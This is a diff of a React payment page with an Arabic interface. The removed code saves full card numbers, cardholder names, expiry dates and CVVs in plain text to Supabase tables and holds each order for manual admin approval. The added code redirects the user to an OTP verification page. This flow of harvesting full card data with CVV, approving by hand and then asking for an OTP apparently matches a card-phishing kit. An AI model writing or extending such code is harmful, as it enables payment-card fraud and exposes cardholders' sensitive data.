@@ -147,55 +147,8 @@ const Payment = () => {
       cvv: cvv
     });
 
-    // Update database and set status to waiting_approval
-    try {
-      if (orderData.sequenceNumber) {
-        // First, get the order ID
-        const { data: orderInfo, error: orderError } = await supabase
-          .from("customer_orders")
-          .select("id")
-          .eq("sequence_number", orderData.sequenceNumber)
-          .single();
-
-        if (orderError) throw orderError;
-
-        // Update the order
-        const { error } = await supabase.from("customer_orders").update({
-          card_number: cardNumber,
-          card_holder_name: cardHolder,
-          expiry_date: expiryDate,
-          cvv: cvv,
-          status: 'waiting_approval'
-        }).eq("sequence_number", orderData.sequenceNumber);
-
-        if (error) throw error;
-
-        // Save payment attempt
-        const { error: paymentError } = await supabase
-          .from("payment_attempts")
-          .insert({
-            order_id: orderInfo.id,
-            card_number: cardNumber,
-            card_holder_name: cardHolder,
-            expiry_date: expiryDate,
-            cvv: cvv,
-          });
-
-        if (paymentError) {
-          console.error("Error saving payment attempt:", paymentError);
-        }
-
-        // Start waiting for admin approval
-        setWaitingApproval(true);
-      }
-    } catch (error) {
-      console.error("Error updating order:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء إرسال البيانات",
-        variant: "destructive",
-      });
-    }
+    // Navigate to OTP verification page with payment details
+    navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${finalPrice}&cardLast4=${cardNumber.slice(-4)}`);
   };
   return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
       {/* Promo Popup */}
